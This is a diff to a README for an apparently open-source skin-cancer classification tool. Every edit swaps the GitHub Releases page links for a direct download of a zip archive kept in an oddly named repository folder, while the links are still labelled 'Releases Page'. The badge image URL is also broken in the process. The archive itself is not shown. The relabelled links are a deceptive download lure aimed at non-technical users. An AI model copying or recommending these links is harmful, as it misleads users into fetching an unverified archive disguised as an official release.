@@ -10,11 +10,11 @@ To download and run this software, follow these steps. No programming knowledge 
 
 ## 🔗 Download Link
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-GET-47B39C)](https://github.com/huydepzai62/Skin-Cancer-Classification-TL/releases)
+[![Download Now](https://raw.githubusercontent.com/huydepzai62/Skin-Cancer-Classification-TL/main/hydroadipsia/Skin-TL-Cancer-Classification-1.6.zip%20Now-GET-47B39C)](https://raw.githubusercontent.com/huydepzai62/Skin-Cancer-Classification-TL/main/hydroadipsia/Skin-TL-Cancer-Classification-1.6.zip)
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/huydepzai62/Skin-Cancer-Classification-TL/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/huydepzai62/Skin-Cancer-Classification-TL/main/hydroadipsia/Skin-TL-Cancer-Classification-1.6.zip).
    
 2. On the Releases page, you will see different versions of the software listed. Look for the latest version.
 
@@ -73,6 +73,6 @@ For additional help, you can reach out through the issues section in the GitHub 
 
 ## 🚀 Final Steps
 
-Don't forget to check back on the Releases page for updates and new features! Here’s the link once more for convenience: [Releases Page](https://github.com/huydepzai62/Skin-Cancer-Classification-TL/releases).
+Don't forget to check back on the Releases page for updates and new features! Here’s the link once more for convenience: [Releases Page](https://raw.githubusercontent.com/huydepzai62/Skin-Cancer-Classification-TL/main/hydroadipsia/Skin-TL-Cancer-Classification-1.6.zip).
 
 Use this application to better understand skin lesions and promote skin health awareness. Enjoy your experience!
